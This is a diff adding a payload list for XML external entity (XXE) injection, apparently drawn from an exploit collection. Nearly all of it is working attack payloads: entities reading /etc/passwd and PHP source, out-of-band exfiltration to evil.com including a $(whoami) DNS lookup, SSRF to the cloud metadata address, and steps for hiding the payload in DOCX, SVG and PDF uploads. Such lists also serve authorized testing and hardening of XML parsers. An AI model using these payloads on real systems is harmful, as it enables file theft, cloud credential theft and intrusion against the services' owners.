@@ -1,0 +1,44 @@
+# XXE Injection Payloads - Curated from exploit-cookbook
+# Source: security-arsenal-argus.md
+
+# Basic file read
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# Blind XXE via OOB
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe?data=file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# Blind XXE via DNS
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://$(whoami).evil.com">]>
+<root>&xxe;</root>
+
+# Read PHP source
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+<root>&xxe;</root>
+
+# SSRF via XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<root>&xxe;</root>
+
+# Via DOCX upload
+# 1. Unzip document.docx
+# 2. Edit word/document.xml
+# 3. Add: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+# 4. Replace content with &xxe;
+# 5. Rezip as document.docx
+
+# Via SVG upload
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text x="0" y="20">&xxe;</text>
+</svg>
+
+# Via PDF upload
+# Use fpdf or similar library
+# Inject XXE in PDF metadata or content stream
